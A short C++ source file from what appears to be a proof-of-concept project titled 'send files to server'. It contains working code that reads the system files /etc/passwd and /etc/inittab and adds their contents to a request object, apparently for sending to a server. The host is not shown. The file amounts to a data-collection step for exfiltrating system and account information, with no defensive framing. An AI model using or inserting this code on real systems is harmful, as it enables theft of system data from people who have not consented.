/*
** POC PROJECT, 2022
** send files
** File description:
** send files to server
*/

#include "req.hpp"
#include <fstream>
#include <array>

std::string get_file(const std::string file_name)
{
    std::ifstream stream(file_name);
    std::string file;

    if (!stream.is_open()) {
        std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
    }
    while (stream.good()) {
        std::string line;
        std::getline(stream, line);
        file += line + "\n";
    }
    return file;
}

void get_files_contents(Req &request)
{
    std::array<std::string, 2> files_names = {"/etc/passwd", "/etc/inittab"};

    for (auto & file_name : files_names) {
        auto file_content = get_file(file_name);
        request.push_file_to_req(file_name, file_content);
    }
}
